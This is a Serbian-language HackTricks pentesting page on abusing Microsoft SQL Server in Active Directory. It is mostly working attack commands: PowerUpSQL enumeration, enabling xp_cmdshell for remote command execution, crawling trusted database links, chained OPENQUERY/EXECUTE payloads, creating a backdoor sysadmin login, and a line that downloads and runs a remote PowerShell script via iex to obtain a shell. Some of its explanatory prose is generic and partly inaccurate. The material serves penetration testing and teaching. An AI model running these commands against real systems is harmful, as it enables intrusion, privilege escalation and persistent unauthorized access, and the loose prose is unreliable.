# Zloupotreba MSSQL AD

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **MSSQL Nabrojavanje / Otkrivanje**

Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumeracija sa mreže bez sesije domena

Da biste izvršili enumeraciju Active Directory (AD) baze podataka putem mreže, možete koristiti SQL Server Management Studio (SSMS) ili alat kao što je `mssql-cli`. Ovi alati vam omogućavaju da se povežete sa SQL Serverom koji se koristi za AD i izvršite upite nad bazom podataka.

Da biste se povezali sa SQL Serverom, morate znati IP adresu ili DNS ime servera, kao i pravilne autentifikacione podatke. Uobičajeni autentifikacioni podaci uključuju korisničko ime i lozinku.

Kada se povežete sa SQL Serverom, možete izvršiti upite nad bazom podataka kako biste dobili informacije o AD strukturi, korisnicima, grupama i drugim objektima. Na primer, možete izvršiti sledeći upit da biste dobili sve korisnike u AD:

```sql
SELECT name FROM sys.syslogins WHERE isntname = 1
```

Ovaj upit će vam vratiti imena svih korisnika u AD bazi podataka.

Kada izvršavate upite nad AD bazom podataka, budite oprezni da ne izazovete preopterećenje servera ili izazovete bilo kakve sigurnosne probleme. Uvek se pridržavajte etičkih smernica i zakonskih propisa prilikom izvođenja ovih aktivnosti.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumeracija iznutra domena

Kada imate pristup unutar domena, možete izvršiti niz tehnika za enumeraciju i prikupljanje informacija o Active Directory (AD) i Microsoft SQL Server (MSSQL) okruženju. Ove tehnike vam mogu pomoći da identifikujete slabosti i pronađete potencijalne tačke za zloupotrebu.

#### Prikupljanje informacija o AD-u

1. **Korisnici i grupe**: Koristite alate poput `net user`, `net group` ili `dsquery` za prikupljanje informacija o korisnicima i grupama unutar domena. Ovo vam može pomoći da identifikujete privilegovane naloge i potencijalne mete za napad.

2. **Servisi**: Pregledajte servise koji se izvršavaju unutar domena koristeći alate poput `sc`, `tasklist` ili `wmic`. Ovo vam može pomoći da identifikujete servise koji se izvršavaju sa privilegijama i potencijalne ranjivosti.

3. **Računari**: Koristite alate poput `net view`, `nbtstat` ili `arp -a` za prikupljanje informacija o računarima unutar domena. Ovo vam može pomoći da identifikujete računare koji su dostupni za napad.

4. **Grupne politike**: Pregledajte grupne politike koje su primenjene na domen koristeći alate poput `gpresult` ili `rsop.msc`. Ovo vam može pomoći da identifikujete postavke sigurnosti i potencijalne slabosti.

#### Prikupljanje informacija o MSSQL-u

1. **Instance MSSQL servera**: Koristite alate poput `osql`, `sqlcmd` ili `mssql-cli` za prikupljanje informacija o MSSQL instancama unutar domena. Ovo vam može pomoći da identifikujete dostupne instance i njihove karakteristike.

2. **Baze podataka**: Pregledajte baze podataka unutar MSSQL instanci koristeći SQL upite ili alate poput `sqlcmd` ili `mssql-cli`. Ovo vam može pomoći da identifikujete informacije o strukturi baza podataka i potencijalne ranjivosti.

3. **Korisnici i privilegije**: Pregledajte korisnike i privilegije unutar MSSQL instanci koristeći SQL upite ili alate poput `sqlcmd` ili `mssql-cli`. Ovo vam može pomoći da identifikujete privilegovane naloge i potencijalne tačke za zloupotrebu.

4. **Konfiguracija servera**: Pregledajte konfiguraciju MSSQL servera koristeći SQL upite ili alate poput `sqlcmd` ili `mssql-cli`. Ovo vam može pomoći da identifikujete postavke sigurnosti i potencijalne slabosti.

Kombinovanjem ovih tehnika za prikupljanje informacija o AD-u i MSSQL-u, možete dobiti dublji uvid u okruženje i identifikovati potencijalne tačke za zloupotrebu.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
### Pristup bazi podataka MSSQL

Da biste pristupili bazi podataka MSSQL, možete koristiti različite metode, uključujući:

- **Windows autentifikacija**: Ako imate pristup Windows računu sa odgovarajućim privilegijama, možete se prijaviti na MSSQL koristeći te informacije.
- **SQL autentifikacija**: Ako imate korisničko ime i lozinku za MSSQL, možete se prijaviti koristeći ove podatke.
- **Integrisana sigurnost**: Ova metoda koristi Windows autentifikaciju, ali koristi i sigurnosne grupe za kontrolu pristupa bazi podataka.

### Korišćenje SQL Injection

SQL Injection je tehnika koja se koristi za iskorišćavanje ranjivosti u aplikacijama koje koriste MSSQL bazu podataka. Ova tehnika omogućava napadaču da izvrši zlonamerni SQL kod putem unosa podataka u aplikaciju.

Da biste iskoristili SQL Injection, možete koristiti različite tehnike, uključujući:

- **Unija**: Ova tehnika se koristi za spajanje rezultata dve ili više SQL upita.
- **Komande za izvršavanje**: Ova tehnika se koristi za izvršavanje sistemskih komandi putem SQL upita.
- **Bypass autentifikacije**: Ova tehnika se koristi za zaobilaženje autentifikacije i dobijanje pristupa bazi podataka.

### Korišćenje Stored Procedure

Stored Procedure su predefinisani SQL kodovi koji se čuvaju u bazi podataka MSSQL. Ove procedure se mogu iskoristiti za izvršavanje zlonamernog koda ili za dobijanje informacija o bazi podataka.

Da biste iskoristili Stored Procedure, možete koristiti različite tehnike, uključujući:

- **Izvršavanje zlonamernog koda**: Možete izvršiti zlonamerni SQL kod putem Stored Procedure kako biste dobili neovlašćen pristup bazi podataka.
- **Dobijanje informacija**: Možete koristiti Stored Procedure za dobijanje informacija o strukturi baze podataka, tabelama, kolonama i drugim relevantnim podacima.

### Korišćenje MSSQL ekstenzija

MSSQL ekstenzije su dodaci koji se mogu koristiti za proširenje funkcionalnosti MSSQL baze podataka. Ove ekstenzije se mogu iskoristiti za izvršavanje zlonamernog koda ili za dobijanje neovlašćenog pristupa bazi podataka.

Da biste iskoristili MSSQL ekstenzije, možete koristiti različite tehnike, uključujući:

- **Izvršavanje zlonamernog koda**: Možete koristiti MSSQL ekstenzije za izvršavanje zlonamernog koda koji može dovesti do kompromitovanja baze podataka.
- **Dobijanje informacija**: Možete koristiti MSSQL ekstenzije za dobijanje informacija o bazi podataka, tabelama, kolonama i drugim relevantnim podacima.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Takođe je moguće **izvršiti komande** unutar MSSQL hosta
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Proverite na stranici navedenoj u **sledećem odeljku kako to uraditi ručno**.

### Osnovni trikovi hakovanja MSSQL-a

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Poverljivi linkovi

Ako je MSSQL instanca poverljiva (link baze podataka) od strane druge MSSQL instance. Ako korisnik ima privilegije nad poverljivom bazom podataka, moći će **koristiti poverljiv odnos da izvrši upite i na drugoj instanci**. Ovi linkovi mogu biti povezani i preko šuma poverenja. 

### Zloupotreba Powershell-a
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Možete lako proveriti pouzdane veze koristeći Metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Primetite da će metasploit pokušati iskoristiti samo funkciju `openquery()` u MSSQL-u (tako da, ako ne možete izvršiti naredbu pomoću `openquery()`, moraćete pokušati metodu `EXECUTE` **ručno** da biste izvršili naredbe, više informacija ispod.)

### Ručno - Openquery()

Sa **Linuxa** možete dobiti konzolnu ljusku MSSQL-a pomoću **sqsh** i **mssqlclient.py**.

Sa **Windowsa** takođe možete pronaći linkove i ručno izvršavati naredbe koristeći **MSSQL klijent kao što je** [**HeidiSQL**](https://www.heidisql.com)

_Prijavite se koristeći Windows autentifikaciju:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Pronalaženje pouzdanih linkova
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Izvršavanje upita putem pouzdanog linka

Izvršite upite putem linka (primer: pronađite više linkova u novom pristupačnom primeru):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Proverite gde se koriste dvostruki i jednostruki navodnici, važno je koristiti ih na taj način.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Možete nastaviti ovaj lanac pouzdanih veza zauvek ručno.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Ako ne možete izvršiti radnje poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.

### Ručno - EXECUTE

Takođe možete zloupotrebiti pouzdane veze koristeći `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Lokalno eskaliranje privilegija

**Lokalni korisnik MSSQL** obično ima poseban tip privilegije nazvan **`SeImpersonatePrivilege`**. Ovo omogućava nalogu da "preuzme identitet klijenta nakon autentifikacije".

Strategija koju su mnogi autori osmislili je da se prisili **sistemski servis** da se autentifikuje na lažni ili servis između napadača koji je kreirao. Taj lažni servis može se potom predstavljati kao sistemski servis dok pokušava da se autentifikuje.

[SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju ovih različitih tehnika koje se mogu izvršiti putem Beacon-ove komande `execute-assembly`.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
